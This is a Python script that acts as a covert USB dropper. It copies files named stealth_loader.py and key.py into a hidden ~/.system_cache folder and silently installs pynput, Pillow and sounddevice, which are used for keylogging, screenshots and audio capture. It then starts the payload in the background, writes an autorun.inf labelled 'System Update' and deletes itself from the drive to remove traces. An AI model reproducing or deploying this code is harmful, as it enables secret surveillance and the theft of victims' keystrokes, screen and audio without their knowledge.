#!/usr/bin/env python3
"""
USB Auto-Launch Script
Automatically starts when USB is plugged in and runs silently.
"""
import os
import sys
import time
import subprocess
import threading
import shutil
from pathlib import Path

class USBAutoLauncher:
    def __init__(self):
        self.usb_path = self.get_usb_path()
        self.target_dir = os.path.expanduser('~/.system_cache')
        self.install_dir = os.path.join(self.target_dir, 'services')
        
    def get_usb_path(self):
        """Get the USB drive path."""
        # Common USB mount points
        possible_paths = [
            '/media', '/mnt', '/run/media'
        ]
        
        for base_path in possible_paths:
            if os.path.exists(base_path):
                for item in os.listdir(base_path):
                    full_path = os.path.join(base_path, item)
                    if os.path.ismount(full_path):
                        # Check if this is our USB (look for our files)
                        if self.is_our_usb(full_path):
                            return full_path
        
        return None
    
    def is_our_usb(self, path):
        """Check if this USB contains our files."""
        marker_files = [
            'usb_autorun.py',
            'main.py',
            'core/',
            'stealth_loader.py'
        ]
        
        for marker in marker_files:
            if not os.path.exists(os.path.join(path, marker)):
                return False
        return True
    
    def copy_to_system(self):
        """Copy files from USB to system silently."""
        try:
            # Create target directory
            os.makedirs(self.install_dir, exist_ok=True)
            
            # Copy all necessary files
            files_to_copy = [
                'main.py',
                'stealth_loader.py',
                'core/',
                'key.py'
            ]
            
            for item in files_to_copy:
                src = os.path.join(self.usb_path, item)
                dst = os.path.join(self.install_dir, item)
                
                if os.path.isdir(src):
                    if os.path.exists(dst):
                        shutil.rmtree(dst)
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
            
            return True
        except Exception as e:
            return False
    
    def install_dependencies(self):
        """Install Python dependencies silently."""
        try:
            # Install required packages
            packages = [
                'pynput', 'Pillow', 'sounddevice', 'numpy', 'psutil'
            ]
            
            for package in packages:
                subprocess.run([
                    sys.executable, '-m', 'pip', 'install', 
                    '--quiet', '--disable-pip-version-check', package
                ], capture_output=True)
            
            return True
        except Exception:
            return False
    
    def install_system_deps(self):
        """Install system dependencies silently."""
        try:
            if sys.platform.startswith('linux'):
                # Install PortAudio for audio recording
                subprocess.run([
                    'apt-get', 'update', '-qq'
                ], capture_output=True)
                
                subprocess.run([
                    'apt-get', 'install', '-y', '-qq',
                    'portaudio19-dev', 'libasound2-dev'
                ], capture_output=True)
            
            return True
        except Exception:
            return False
    
    def start_silently(self):
        """Start the main script silently."""
        try:
            main_script = os.path.join(self.install_dir, 'main.py')
            
            # Start with nohup to run in background
            subprocess.Popen([
                'nohup', sys.executable, main_script, '>/dev/null', '2>&1', '&'
            ], shell=True)
            
            return True
        except Exception:
            return False
    
    def create_autorun_entry(self):
        """Create autorun entry for future USB insertions."""
        try:
            # Create autorun.inf for Windows compatibility
            autorun_content = """[autorun]
open=pythonw.exe usb_autorun.py
icon=icon.ico
label=System Update
"""
            
            autorun_path = os.path.join(self.usb_path, 'autorun.inf')
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            return True
        except Exception:
            return False
    
    def run(self):
        """Main execution function."""
        # Wait a moment for USB to be fully mounted
        time.sleep(2)
        
        if not self.usb_path:
            return
        
        # Step 1: Copy files to system
        if not self.copy_to_system():
            return
        
        # Step 2: Install Python dependencies
        if not self.install_dependencies():
            return
        
        # Step 3: Install system dependencies
        if not self.install_system_deps():
            return
        
        # Step 4: Start the main script silently
        if not self.start_silently():
            return
        
        # Step 5: Create autorun entry for future use
        self.create_autorun_entry()
        
        # Step 6: Clean up USB traces
        self.cleanup_usb_traces()
    
    def cleanup_usb_traces(self):
        """Remove traces from USB."""
        try:
            # Remove autorun script from USB
            autorun_script = os.path.join(self.usb_path, 'usb_autorun.py')
            if os.path.exists(autorun_script):
                os.remove(autorun_script)
        except Exception:
            pass

def main():
    """Main function."""
    launcher = USBAutoLauncher()
    launcher.run()

if __name__ == "__main__":
    main() 